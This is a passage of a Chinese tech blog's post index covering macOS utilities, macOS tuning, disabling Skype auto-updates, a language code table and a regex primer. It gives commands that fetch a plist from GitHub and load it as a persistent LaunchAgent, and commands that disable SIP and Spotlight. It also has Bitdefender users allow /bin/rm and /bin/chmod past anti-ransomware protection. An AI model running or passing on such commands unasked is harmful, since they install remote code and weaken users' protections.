是一款模拟真实用户打字，随机延时，自动输入文本到对话框的程序。目前只支持英文和数字。 如何安装 从 软件列表 下载 Auto Type 软件。 在 Downloads 目录找到 DMG 文件，然后打开它。 把 AutoType 拖到 Applications 文件夹然后松开。 运行 从启动台打开 Auto Type。 如果是第一次使用 Auto Type 会出现下图的提示。请按照下面的步骤解决。 打开系统偏好设定。 点击安全性与隐私权 点击强制打开按钮 点击隐私权，然后在辅助使用里面添加AutoType并且勾选。 使用方法 新建一个 txt 格式的文件，输入内容，并且保存。 运行 Auto Type，选择刚才保存好的 txt 文件。 等待三秒后就会开始将选中的 txt 文件中的内容自动输入到对话框，请在三秒内选中一个对话框。效果如下图。注意：在使用前请将输入法切换成英文，以免出现问题。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"自动输入","feature":"https://dev-coco.github.io/post-images/Auto-Type.png","link":"https://dev-coco.github.io/post/Auto-Type/","stats":{"text":"1 min read","time":56000,"words":268,"minutes":1},"date":"2022-02-07 21:08:03","dateFormat":"2022-02-07"},{"content":"创建 Telegram 机器人，获取 token。 在 Telegram 搜索 @BotFather，如果是第一次使用，需要在对话窗口的下方点击开始。 输入命令 /newbot，然后输入一个机器人的名字。 再设置一个机器人的用户名，必须以 bot 作为结尾。 注册成功后会发送机器人的 token。 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"创建 Telegram 机器人","feature":"https://dev-coco.github.io/post-images/Create-Telegram-Bot.png","link":"https://dev-coco.github.io/post/Create-Telegram-Bot/","stats":{"text":"1 min read","time":18000,"words":86,"minutes":1},"date":"2022-02-07 13:44:04","dateFormat":"2022-02-07"},{"content":"查询 Linux 命令功能。 .search-box .search{display:block;margin-left:auto;margin-right:auto;margin-bottom:500px;width:auto;position:relative}.search-box .search li,.search-box .search ul{list-style:none}.search-box .search .search-list{position:absolute;box-shadow:1px 1px 3px #ededed;border:1px solid #d5d5d5;background:#fff;top:39px;width:100%;padding:5px;border-radius:5px 5px 5px 5px}.search-box .search .search-list a{display:block;padding:2px 6px 2px 6px;color:#555}.search-box .search .search-list a .kw{color:red;font-style:inherit;font-weight:700}.search-box .search .query{width:100%;height:40px;padding:6px 12px;font-size:14px;font-weight:700;line-height:1.42857143;color:#555;border:1px solid #d5d5d5;border-radius:5px}.post-title,.post-info,.post-content p:first-child{display:none;} Linux命令手册请尝试输入一些字符，进行搜索！ ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"Linux 命令手册","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/Linux-Command/","stats":{"text":"1 min read","time":54000,"words":156,"minutes":1},"date":"2022-02-06 11:37:42","dateFormat":"2022-02-06"},{"content":"你的电脑是否经常遇到卡顿，运行缓慢的问题呢？ macOS 系统是否能提供最佳的性能是办公的关键，本文将告诉你如何优化 macOS 系统的运行速度，主要围绕软件方面和硬件方面。 软件方面 清理垃圾缓存 系统和软件在运行过程中会产生各种各样的文件，例如：缓存文件 (Cache Files)，文件缓冲 (File Cache)，临时文件 (Temporary Files)，日志（Logs），软件卸载残留文件等等。 这里给大家推荐一款 macOS 清理垃圾 软件，简单易用，清理效果好。使用方法特别简单，运行程序，选择“清理缓存”，点击“好”就清理完成了。 系统优化 Mac系统其实有自带的性能模式。可以通过命令来开启。开启后需要重启一次电脑，界面不会有任何的提示或者变化，静默运行的。更多详细内容可以查看 苹果官方文档。 10.0 ~ 10.10.5 版本 开启性能模式 serverinfo --setperfmode 1 关闭性能模式 serverinfo --setperfmode 0 查看当前模式 serverinfo --perfmode 10.11 及更高版本 开启性能模式 sudo nvram boot-args=&quot;serverperfmode=1 $(nvram boot-args 2&gt;/dev/null | cut -f 2-)&quot; 关闭性能模式 sudo nvram boot-args=&quot;$(nvram boot-args 2&gt;/dev/null | sed -e $'s/boot-args\\t//;s/serverperfmode=1//')&quot; 查看当前模式 nvram boot-args 在 macOS 清理垃圾 软件内也包含了这个功能，使用系统优化功能即可开启性能模式。 管理启动项 过多的启动项会拖慢系统的开机速度，在启动的时候消耗过多的 RAM，如果不是必要的程序，可以在启动后再运行。 打开系统偏好设定 —— 使用者与群组 —— 登陆项目 把需要关闭的启动项选中，点击 — 符号删除。 以下三个是启动项的目录，有的启动项不会在系统偏好内显示，但是可以在下面的目录中找到，可以使用 launchctl 命令关闭不需要的进程后再删除文件。 /Library/LaunchAgents /Library/LaunchDaemons /Users/$USER/Library/LaunchAgents 关闭 Dashboard Mac 系统上有个叫 Dashboard 的东西，也叫仪表盘，这个东西在日常使用中几乎用不到，而且还占用着 CPU 使用率和内存。 打开系统偏好设定——指挥中心——仪表盘（关闭） 如果你想彻底关它可以使用以下命令 defaults write com.apple.dashboard mcx-disabled -boolean YES 如果你想关闭后再重新开启，可以使用以下命令 defaults write com.apple.dashboard mcx-disabled -boolean NO 关闭独显 当设备使用独立显卡的时候，将会更多的消耗设备的内存和 CPU 使用，同时设备的温度也会升高，如果是用不到独显的话，建议禁用。 禁用独显 sudo pmset -a GPUSwitch 0 如果想要强制使用独显可以把值设置成 1，2 是自动切换显卡。 关闭 Spotlight Spotlight 是 macOS 上的一个搜索引擎，能够快速的搜索到想要的文档，但是 Spotlight 也有一个弊端，它会不断的索引文件，所以会看到 Spotlight 在后台默默的占用资源，关闭这个功能后会降低设备的温度也会加快设备的流畅度。 打开系统偏好设定——Spotlight——搜索结果（全部取消选择） 然后再运行以下命令关闭 Spotlight 功能 关闭Spotlight sudo mdutil -a -i off sudo launchctl unload -w /System/Library/LaunchAgents/com.apple.Spotlight.plist 开启Spotlight sudo mdutil -a -i on sudo launchctl load -w /System/Library/LaunchAgents/com.apple.Spotlight.plist 不过在操作前需要暂时关闭 SIP 保护。在 Mac 开机的时候按 Command ⌘ + R 进入恢复模式，然后执行 SIP 相关命令。 风扇 设备的温度如果过高会导致 CPU 降频，降低设备的运行速度。macOS 虽然有自动调节风扇转速的机制，但是有时候不太精准。推荐使用 Macs Fan Control 这个软件，可以自定义设置风扇的转速来调节。在使用的过程中有一点需要注意，不要开了风扇忘记关了，这样让风扇长时间在高转速的状态下运行，会过多的消耗风扇的寿命。 优化内存 有时候有的程序会大量的占用内存，使用下面这个命令可以暂时的释放出内存。 sudo purge 清理 DNS 缓存 macOS 开机使用一段时间后就会发现，网络没问题，但是 macOS 打开网页加载就特别慢，或者无法打开网页。那么这个时候就需要清理一下 DNS 缓存了，可以使用以下命令。 dscacheutil -flushcache 推荐使用 macOS 清理垃圾 软件内置的系统优化功能，可以在每 30 分钟清理一次 DNS 缓存和释放内存。 限制 CPU 使用率 当 Mac 多个程序同时运行的时候，个别程序如果占用 CPU 太高，会导致系统整体卡顿，设备发热。这时候就可以使用 限制软件 CPU 使用率 这个程序，合理分配程序的 CPU 使用率，可以让多个程序运行的同时，系统还可以流畅运行。 硬件层 配件 有的人喜欢使用键盘膜，可以反止灰尘从键盘进入，而且还可以防止水溅到键盘流到设备内部，但是有利也有弊。使用键盘膜的时候同时也会阻挡了设备更好的散热，当设备温度过高的时候 CPU 就会降频，降低流畅度。 设备机身的材质是使用铝合金，铝合金材质本身散热效果就不错，但是有的人喜欢使用保护壳，避免磕磕碰碰对 Mac 的机身造成损伤，不过使用保护壳会导致设备的散热效果降低，如果需要使用保护壳切记要记得避免皮质和毛绒材质的保护壳，这类材质散热效果差。在选用保护壳之前需要先了解设备的出风口在哪，避免遮挡保护壳导致无法正常散热。 内存 增加系统流畅度最有效的方法就是给设备安装内存条，增加运行内存。 清理灰尘 当设备用过几年后，设备内就会积攒了灰尘，影响散热，同时也会影响系统的流畅度，可以定期清理一次设备内的灰尘。 散热 当设备温度过高的时候就会造成 CPU 降频，影响系统的流畅度。这里就给大家介绍几种常见的散热方式。 散热底座 散热底座是从底部向上吹风，用于吹设备的底部。 抽风式散热器 大风量抽出设备内部的热气。 支架 将设备架高，让设备的底部有更多的空间散热。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"macOS 系统优化","feature":"https://dev-coco.github.io/post-images/Mac-System-Boost.png","link":"https://dev-coco.github.io/post/Mac-System-Boost/","stats":{"text":"7 min read","time":382000,"words":1755,"minutes":7},"date":"2022-02-05 12:50:30","dateFormat":"2022-02-05"},{"content":"全新 macOS 清理垃圾工具，超彻底深度清理。支持清理缓存，清理卸载残留，系统优化功能。 如何安装 从 软件列表 下载 Mac Cleaner 软件。 在 Downloads 目录找到 DMG 文件，然后打开它。 把 Mac Cleaner 拖到 Applications 文件夹然后松开。 运行 从启动台打开 Mac Cleaner。 如果是第一次使用 Mac Cleaner 会出现下图的提示。没关系按照下面的步骤解决。 打开系统偏好设定 点击安全性与隐私权 点击强制打开按钮 选择功能，然后点击“好”。 清理缓存 如果显示下图的提示，点击“好”，然后输入启动密码，点击“好”。 清理完成! 卸载残留文件 这个功能会清理Avast和Zoom的卸载残留文件，但是我会持续更新这个脚本。 系统优化 开启 macOS 系统自带的性能模式，提高性能和运行速度。不论是开启还是关闭此功能，都需要重启电脑。 进阶功能 打开系统偏好设定 点击安全性与隐私权 点击隐私权——点击左下角的锁头，然后输入开机密码。 完全取用磁碟——添加终端机到里面 对比 下面选了几款 macOS 系统热门的清理垃圾软件，对清理力度做了对比，结果如下（仅供参考）。 项目 Mac Cleaner CCleaner CleanMyMac X Combo Cleaner 应用程序缓存 ✅ ✅ ✅ ✅ Xcode缓存 ✅ ❌ ✅ ❌ 下载目录 ❌ ✅ ❌ ✅ 回收站 ✅ ✅ ❌ ✅ 系统缓存 ✅ ❌ ✅ ❌ 用户缓存 ✅ ❌ ✅ ❌ 用户日志 ✅ ✅ ✅ ✅ 系统日志 ✅ ✅ ✅ ❌ Safari缓存 ✅ ✅ ❌ ❌ Google Chrome缓存 ✅ ✅ ❌ ❌ Brave Browser缓存 ✅ ❌ ❌ ❌ 诊断报告 ✅ ❌ ❌ ❌ 奔溃报告 ✅ ❌ ❌ ❌ 下载记录 ✅ ❌ ❌ ❌ 终端记录 ✅ ❌ ❌ ❌ 补充设置 下面的设置仅针对使用 Bitdefender 的用户。 打开 Bitdefender，点击 Protection——Anti-Randsomware——Application Access 在打开的窗口点击左下角的 + 符号。 然后在键盘上按快捷键 Shift ⇪ + Command ⌘ + G 搜索/bin/rm，点击 Go 找到后点 Open 输入开机密码 在 Action 那边选择 Access 再重复以上的操作，把/bin/chmod也添加进去。 设置完成后就像下图一样。 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"macOS 清理垃圾","feature":"https://dev-coco.github.io/post-images/Mac-Cleaner.png","link":"https://dev-coco.github.io/post/Mac-Cleaner/","stats":{"text":"2 min read","time":113000,"words":527,"minutes":2},"date":"2022-02-05 12:32:42","dateFormat":"2022-02-05"},{"content":"批量下载无版权无肖像权的头像。 无意间在 Github 上看到一个不错的项目 thispersondoesnotexist-js，可以随机生成头像。因为是通过机器生成出来的，并不存在这个世界上，所以不会有版权和肖像权的问题。 每次打开这个链接的时候，都会显示一个新的头像。那么就可以尝试写一个 Javascript 循环来下载头像。 // 设置延迟时间 function delay() { return new Promise(resolve =&gt; { setTimeout(resolve, 1200); }); } for (var i = 0; i &lt; 100; i++) { await delay(); // 创建a标签 const element = document.createElement(&quot;a&quot;); // 设置链接 element.setAttribute(&quot;href&quot;, &quot;https://thispersondoesnotexist.com/image&quot;); // 设置download属性和文件名字 element.setAttribute(&quot;download&quot;, &quot;file.png&quot;); // 隐藏标签，不显示在界面 element.style.display = &quot;none&quot;; // 创建完标签后点击标签，最后删除。 document.body.appendChild(element); element.click(); document.body.removeChild(element); } 实际测试的时候发现这个方法并不是那么理想，效率有些慢，1200 毫秒下载 1 个，而且比较占用 CPU 使用率。 后来我又找到一个项目 fakeface，这个项目的头像来源也是来自 thispersondoesnotexist 项目，不过返回的是 JSON 格式的数据，获取到图片的链接，这样就可以批量下载图片了。代码如下： for (var i = 0; i &lt; 10; i++) { // 请求链接 let response = await fetch(&quot;https://fakeface.rest/face/json&quot;); let json = await response.json(); // 获取链接 var image_url = json.image_url; // 输出到当前页面 document.write(image_url + &quot;&lt;br&gt;&quot;); } 也可以尝试一下 批量下载头像 这个项目，基于上面提到的开源项目做的一个 Chrome 插件。 使用 brew 安装 aria2，如果没有安装过 brew，需要先运行下面的命令先安装 brew。 安装后输入命令 brew install aria2 安装 aria2。 先创建一个文本文件 echo &gt; download-list.txt，然后把刚才输出的链接放到这个文本文件里面。 然后运行下面的命令，这样就可以多线程批量下载头像了。 aria2c --max-concurrent-downloads=70 --input-file=download-list.txt ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"批量下载头像","feature":"https://dev-coco.github.io/post-images/Batch-Download-Avatar.png","link":"https://dev-coco.github.io/post/Batch-Download-Avatar/","stats":{"text":"3 min read","time":128000,"words":525,"minutes":3},"date":"2022-02-04 14:42:23","dateFormat":"2022-02-04"},{"content":"macOS 禁用 Skype 自动更新。 这个进程会禁用所有使用 Squirrel 框架更新的应用程序（例如 Skype）。如果需要安装旧版本的程序，建议在安装后第一次启动之前就安装禁用自动更新的进程，以免一开启应用程序就被强制更新到最新版本。Windows 操作系统禁用 Skype 更新请点击 --&gt;&gt; 禁用 Skype 自动更新。 使用前说明 如果在此之前使用过其他的程序禁用 Squirrel 框架功能，建议先卸载后再继续以下操作，以免造成功能冲突或不生效。如果没有使用过，可以跳过此步骤，继续往下。卸载命令如下： launchctl unload -w /Library/LaunchAgents/*squirrel*.plist &amp;&amp; sudo rm -rf /Library/LaunchAgents/*squirrel*.plist &amp;&amp; launchctl list | grep [sS]quirrel 运行后没有任何内容输出就代表卸载完成了。此方法仅供参考，但不一定所有都通用。 安装命令 cd /Users/$USER/Library/LaunchAgents &amp;&amp; curl https://raw.githubusercontent.com/dev-coco/Disable-Squirrel-Update/master/com.dev-coco.DisableSquirrelUpdate.plist -o com.dev-coco.DisableSquirrelUpdate.plist &amp;&amp; launchctl load -w /Users/$USER/Library/LaunchAgents/com.dev-coco.DisableSquirrelUpdate.plist &amp;&amp; killall -9 Terminal 卸载命令 launchctl unload -w /Users/$USER/Library/LaunchAgents/com.dev-coco.DisableSquirrelUpdate.plist &amp;&amp; rm -rf /Users/$USER/Library/LaunchAgents/com.dev-coco.DisableSquirrelUpdate.plist &amp;&amp; killall -9 Terminal 检测命令 launchctl list | grep com.dev-coco.DisableSquirrelUpdate 如果有输出内容就说明安装成功，进程已经在运行了。如果未显示任何内容代表没有安装成功。详情请看下图： 效果 Skype 旧版本下载 修改对应的版本号即可下载，以下是个例子。 https://download.skype.com/s4l/download/mac/Skype-8.55.0.141.dmg ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"禁用 Squirrel 框架自动更新","feature":"https://dev-coco.github.io/post-images/Disable-Squirrel-Update.png","link":"https://dev-coco.github.io/post/Disable-Squirrel-Update/","stats":{"text":"2 min read","time":108000,"words":425,"minutes":2},"date":"2022-02-04 14:33:52","dateFormat":"2022-02-04"},{"content":"Windows 禁用 Skype 自动更新。 这个工具适用于 Windows 操作系统的 Skype 应用程序。如果你是 Mac OS 操作系统的用户请点击 --&gt;&gt; 禁用 Squirrel 框架自动更新。 使用方法 从 软件列表 下载 Disable Skype Update。 关闭 Skype 后台，安装旧版本 Skype（如果需要的话），安装后请勿启动 Skype！ 双击运行 “Disable-Skype-Update.bat” 文件。这时可能你会看到一个黑框闪过（也可能不会），不会有任何提示。运行后就可以启动 Skype 应用程序了。 启动 Skype，检查一下是否提示更新失败（也有可能会提示正在检查更新，然后过一会就变成更新失败），如下图所示。 如果需要恢复自动更新，点击👉下载，使用管理员权限运行“Disable-Skype-Update-Uninstall.bat”文件，运行后不会有任何提示，使用 Skype 检查版本就会自动更新。 Skype 旧版本下载 修改对应的版本号即可下载，以下是个例子。 https://download.skype.com/s4l/download/win/Skype-8.40.0.70.exe ","tags":[{"name":"Windows","slug":"windows","used":true,"link":"https://dev-coco.github.io/tag/windows/"},{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"}],"title":"禁用 Skype 自动更新","feature":"https://dev-coco.github.io/post-images/Disable-Skype-Update.png","link":"https://dev-coco.github.io/post/Disable-Skype-Update/","stats":{"text":"2 min read","time":62000,"words":277,"minutes":2},"date":"2022-02-04 14:16:02","dateFormat":"2022-02-04"},{"content":"语言代码表。 语言代码 语言名称 af 南非语 af-ZA 南非语 ar 阿拉伯语 ar-AE 阿拉伯语(阿联酋) ar-BH 阿拉伯语(巴林) ar-DZ 阿拉伯语(阿尔及利亚) ar-EG 阿拉伯语(埃及) ar-IQ 阿拉伯语(伊拉克) ar-JO 阿拉伯语(约旦) ar-KW 阿拉伯语(科威特) ar-LB 阿拉伯语(黎巴嫩) ar-LY 阿拉伯语(利比亚) ar-MA 阿拉伯语(摩洛哥) ar-OM 阿拉伯语(阿曼) ar-QA 阿拉伯语(卡塔尔) ar-SA 阿拉伯语(沙特阿拉伯) ar-SY 阿拉伯语(叙利亚) ar-TN 阿拉伯语(突尼斯) ar-YE 阿拉伯语(也门) az 阿塞拜疆语 az-AZ 阿塞拜疆语(拉丁文) az-AZ 阿塞拜疆语(西里尔文) be 比利时语 be-BY 比利时语 bg 保加利亚语 bg-BG 保加利亚语 bs-BA 波斯尼亚语(拉丁文，波斯尼亚和黑塞哥维那) ca 加泰隆语 ca-ES 加泰隆语 cs 捷克语 cs-CZ 捷克语 cy 威尔士语 cy-GB 威尔士语 da 丹麦语 da-DK 丹麦语 de 德语 de-AT 德语(奥地利) de-CH 德语(瑞士) de-DE 德语(德国) de-LI 德语(列支敦士登) de-LU 德语(卢森堡) dv 第维埃语 dv-MV 第维埃语 el 希腊语 el-GR 希腊语 en 英语 en-AU 英语(澳大利亚) en-BZ 英语(伯利兹) en-CA 英语(加拿大) en-CB 英语(加勒比海) en-GB 英语(英国) en-IE 英语(爱尔兰) en-JM 英语(牙买加) en-NZ 英语(新西兰) en-PH 英语(菲律宾) en-TT 英语(特立尼达) en-US 英语(美国) en-ZA 英语(南非) en-ZW 英语(津巴布韦) eo 世界语 es 西班牙语 es-AR 西班牙语(阿根廷) es-BO 西班牙语(玻利维亚) es-CL 西班牙语(智利) es-CO 西班牙语(哥伦比亚) es-CR 西班牙语(哥斯达黎加) es-DO 西班牙语(多米尼加共和国) es-EC 西班牙语(厄瓜多尔) es-ES 西班牙语(传统) es-ES 西班牙语(国际) es-GT 西班牙语(危地马拉) es-HN 西班牙语(洪都拉斯) es-MX 西班牙语(墨西哥) es-NI 西班牙语(尼加拉瓜) es-PA 西班牙语(巴拿马) es-PE 西班牙语(秘鲁) es-PR 西班牙语(波多黎各(美)) es-PY 西班牙语(巴拉圭) es-SV 西班牙语(萨尔瓦多) es-UY 西班牙语(乌拉圭) es-VE 西班牙语(委内瑞拉) et 爱沙尼亚语 et-EE 爱沙尼亚语 eu 巴士克语 eu-ES 巴士克语 fa 法斯语 fa-IR 法斯语 fi 芬兰语 fi-FI 芬兰语 fo 法罗语 fo-FO 法罗语 fr 法语 fr-BE 法语(比利时) fr-CA 法语(加拿大) fr-CH 法语(瑞士) fr-FR 法语(法国) fr-LU 法语(卢森堡) fr-MC 法语(摩纳哥) gl 加里西亚语 gl-ES 加里西亚语 gu 古吉拉特语 gu-IN 古吉拉特语 he 希伯来语 he-IL 希伯来语 hi 印地语 hi-IN 印地语 hr 克罗地亚语 hr-BA 克罗地亚语(波斯尼亚和黑塞哥维那) hr-HR 克罗地亚语 hu 匈牙利语 hu-HU 匈牙利语 hy 亚美尼亚语 hy-AM 亚美尼亚语 id 印度尼西亚语 id-ID 印度尼西亚语 is 冰岛语 is-IS 冰岛语 it 意大利语 it-CH 意大利语(瑞士) it-IT 意大利语(意大利) ja 日语 ja-JP 日语 ka 格鲁吉亚语 ka-GE 格鲁吉亚语 kk 哈萨克语 kk-KZ 哈萨克语 kn 卡纳拉语 kn-IN 卡纳拉语 ko 朝鲜语 ko-KR 朝鲜语 kok 孔卡尼语 kok-IN 孔卡尼语 ky 吉尔吉斯语 ky-KG 吉尔吉斯语(西里尔文) lt 立陶宛语 lt-LT 立陶宛语 lv 拉脱维亚语 lv-LV 拉脱维亚语 mi 毛利语 mi-NZ 毛利语 mk 马其顿语 mk-MK 马其顿语(FYROM) mn 蒙古语 mn-MN 蒙古语(西里尔文) mr 马拉地语 mr-IN 马拉地语 ms 马来语 ms-BN 马来语(文莱达鲁萨兰) ms-MY 马来语(马来西亚) mt 马耳他语 mt-MT 马耳他语 nb 挪威语(伯克梅尔) nb-NO 挪威语(伯克梅尔)(挪威) nl 荷兰语 nl-BE 荷兰语(比利时) nl-NL 荷兰语(荷兰) nn-NO 挪威语(尼诺斯克)(挪威) ns 北梭托语 ns-ZA 北梭托语 pa 旁遮普语 pa-IN 旁遮普语 pl 波兰语 pl-PL 波兰语 pt 葡萄牙语 pt-BR 葡萄牙语(巴西) pt-PT 葡萄牙语(葡萄牙) qu 克丘亚语 qu-BO 克丘亚语(玻利维亚) qu-EC 克丘亚语(厄瓜多尔) qu-PE 克丘亚语(秘鲁) ro 罗马尼亚语 ro-RO 罗马尼亚语 ru 俄语 ru-RU 俄语 sa 梵文 sa-IN 梵文 se 北萨摩斯语 se-FI 北萨摩斯语(芬兰) se-FI 斯科特萨摩斯语(芬兰) se-FI 伊那里萨摩斯语(芬兰) se-NO 北萨摩斯语(挪威) se-NO 律勒欧萨摩斯语(挪威) se-NO 南萨摩斯语(挪威) se-SE 北萨摩斯语(瑞典) se-SE 律勒欧萨摩斯语(瑞典) se-SE 南萨摩斯语(瑞典) sk 斯洛伐克语 sk-SK 斯洛伐克语 sl 斯洛文尼亚语 sl-SI 斯洛文尼亚语 sq 阿尔巴尼亚语 sq-AL 阿尔巴尼亚语 sr-BA 塞尔维亚语(拉丁文，波斯尼亚和黑塞哥维那) sr-BA 塞尔维亚语(西里尔文，波斯尼亚和黑塞哥维那) sr-SP 塞尔维亚(拉丁) sr-SP 塞尔维亚(西里尔文) sv 瑞典语 sv-FI 瑞典语(芬兰) sv-SE 瑞典语 sw 斯瓦希里语 sw-KE 斯瓦希里语 syr 叙利亚语 syr-SY 叙利亚语 ta 泰米尔语 ta-IN 泰米尔语 te 泰卢固语 te-IN 泰卢固语 th 泰语 th-TH 泰语 tl 塔加路语 tl-PH 塔加路语(菲律宾) tn 茨瓦纳语 tn-ZA 茨瓦纳语 tr 土耳其语 tr-TR 土耳其语 ts 宗加语 tt 鞑靼语 tt-RU 鞑靼语 uk 乌克兰语 uk-UA 乌克兰语 ur 乌都语 ur-PK 乌都语 uz 乌兹别克语 uz-UZ 乌兹别克语(拉丁文) uz-UZ 乌兹别克语(西里尔文) vi 越南语 vi-VN 越南语 xh 班图语 xh-ZA 班图语 zh 中文 zh-CN 中文(简体) zh-HK 中文(香港) zh-MO 中文(澳门) zh-SG 中文(新加坡) zh-TW 中文(繁体) zu 祖鲁语 zu-ZA 祖鲁语 ","tags":[{"index":-1,"name":"其它","slug":"other","used":true,"link":"https://dev-coco.github.io/tag/other/"}],"title":"语言代码表","feature":"https://dev-coco.github.io/post-images/Language-Code.png","link":"https://dev-coco.github.io/post/Language-Code/","stats":{"text":"7 min read","time":398000,"words":1643,"minutes":7},"date":"2022-02-04 13:47:25","dateFormat":"2022-02-04"},{"content":"使用快捷键快速压缩图片。 安装 双击“图片压缩”，当出现下图的提示的时候，点击安装。 打开系统偏好设定——键盘——快速键——服务（在最底下）——设置一个快捷键。 同时也支持在 Touch Bar 运行，打开系统偏好设定——延伸功能——触控列——勾选图片压缩。 使用 在 Finder 找到并且选中图片，然后按下快捷键就自动将图片压缩完成。 压缩前 压缩后 ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"macOS 压缩图片","feature":"https://dev-coco.github.io/post-images/Image-Compression.png","link":"https://dev-coco.github.io/post/Image-Compression/","stats":{"text":"1 min read","time":25000,"words":126,"minutes":1},"date":"2022-02-04 13:30:16","dateFormat":"2022-02-04"},{"content":"从分区中恢复已经被删除或被格式化的文件。 从 软件列表 下载 File Recovery 软件。 说明 此软件基于 foremost 制作了 GUI 界面，如果文件被覆盖重写，那就无法被恢复了。支持的文件格式如下： avi, bmp, dll, doc, docx, exe, gif, htm, jar, jpg, mbd, mov, mp4, mpg, ole, pdf, png, ppt, pptx, rar, rif, sdw, sx, sxc, sxi, sxw, vis, wav, wmv, xls, xlsx, zip 使用方法 运行程序后，输入需要恢复的文件类型，如果要恢复多种文件类型，中间使用英文逗号隔开，不要加空格，例如：png,pdf,jpg。输入完成后点击继续。 然后在预设的内容后面输入分区，例如：/dev/rdisk。 设备的分区可以在磁碟工具程式里面找到。输入完成后点击继续。 如果出现下图的提示，点击好。 接下来程序会自动打开终端机，输入开机密码（不会显示），然后按下回车键就开始运行了。 在桌面会看到一个 Recovery 加日期命名的文件夹，里面有恢复出来的文件。分区的空间越大，恢复所耗的时间就越久。 如果是恢复系统分区，需要在使用前需要暂时先关闭 SIP 保护。在 Mac 开机的时候按 Command (⌘)+R 进入恢复模式，然后执行 SIP 相关命令。 关闭SIP csrutil disable 开启SIP csrutil enable ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"恢复删除的文件","feature":"https://dev-coco.github.io/post-images/File-Recovery.png","link":"https://dev-coco.github.io/post/File-Recovery/","stats":{"text":"2 min read","time":81000,"words":360,"minutes":2},"date":"2022-02-04 12:47:29","dateFormat":"2022-02-04"},{"content":"限制程序的 CPU 使用率，让软件在运行的同时也不会造成设备严重发热。 从 软件列表 下载 CPU Limit GUI 软件。 运行程序后，输入软件的进程名。如果不知道进程的名字是什么，可以在活动监视器里面查看。输入完成后点 “继续”。 如果要对指定的 PID 限制 CPU 使用率，可以选择 PID 功能，然后输入程序的 PID 点 “好”。 然后会出现下图的这个页面，选择限制软件的 CPU 使用频率。例如 30，就代表软件的 CPU 使用率只能达到 30%。使用率越低软件对电脑整体的运行速度影响越低，但是过低的使用率可能会导致软件无法流畅使用，所以请合理分配软件的 CPU 使用率。 当设置完成后，程序就会一直在后台运行，不过没关系，这个程序并不会对电脑的性能造成什么影响。当被限制 CPU 使用率的软件关闭后，程序的后台也自动结束。 如果想要限制多个软件的 CPU 使用率，可以在终端机运行以下命令。 open -na /Applications/CPULimitGUI.app --args --secondary ","tags":[{"name":"软件","slug":"software","used":true,"link":"https://dev-coco.github.io/tag/software/"},{"index":-1,"name":"macOS","slug":"macos","used":true,"link":"https://dev-coco.github.io/tag/macos/"}],"title":"限制软件 CPU 使用率","feature":"https://dev-coco.github.io/post-images/CPU-Limit-GUI.png","link":"https://dev-coco.github.io/post/CPU-Limit-GUI/","stats":{"text":"2 min read","time":66000,"words":315,"minutes":2},"date":"2022-02-04 09:08:16","dateFormat":"2022-02-04"},{"content":"正则表达式语法 0 基础速成。 c{margin-right:10px;padding:2px 4px;font-size:90%;color:#c7254e;background-color:#f9f2f4;border-radius:4px}l{background-color:#b0d1e8;margin-left:1px;margin-right:1px} 什么是正则表达式 用来匹配字符串的一种语法。可以从大量的字符串中匹配出自己想要的一部分内容。 说明 本文将采用粉色背景代表正则表达式语法，蓝色背景代表正则表达式匹配到的内容。 元字符 .匹配换行符以外的任意字符 例子 表达式：a.g 文本：august orange 匹配结果：augang ^匹配字符串的开始 例子 表达式：^b.. 文本：bird is black color 匹配结果：bir $匹配字符串的结束 例子 表达式：er$ 文本：His efforts were fruitless, however 匹配结果：er \\w匹配字母数字或者下划线 例子 表达式：\\w 文本：价格：$1.5, 名字：Aaron_C 匹配结果：15Aaron_C \\d匹配任意数字，同等于[0-9] 例子 表达式：\\d 文本：我有100个气球 匹配结果：100 \\s匹配任意不可见字符，例如空格、制表符、换行符等 例子 表达式：\\s 文本：I got three gold coins. 匹配结果： (四个空格) \\b匹配单词的开始或结束 例子 表达式：\\bcup\\b 文本：I have three cups and he has one cup. 匹配结果：cup 反义 \\D匹配不是数字的字符 例子 表达式：\\D 文本：1个西瓜15斤 匹配结果：个西瓜斤 \\W匹配不是字母、数字、下划线的字符 例子 表达式：\\W 文本：This music style R&amp;B. 匹配结果： &amp;.(三个空格&amp;.) \\S匹配任意可见字符 例子 表达式：\\S 文本：Macbookistooexpensive. 匹配结果：Macbookistooexpensive. \\B匹配不是单词开头或结束的位置 例子 表达式：can\\B 文本：can I have a candy? 匹配结果：can 限定符 +重复1次或更多次, 同等于{1,} 例子 表达式：10+ 文本：1乘以10不等于100 匹配结果：10100 ?重复0次或1次, 同等于{0,1} 例子 表达式：10? 文本：我有1杯水和10本书还有100支笔 匹配结果：11010 *重复任意次, 同等于{0,} 例子 表达式：10* 文本：1乘以10不等于100 匹配结果：110100 分支条件 |将多个匹配条件进行逻辑“或”运算。 例子 表达式：ant|ch 文本：I like this restaurantvery much. 匹配结果：antch 括号 (括号)、[中括号]、{大括号} 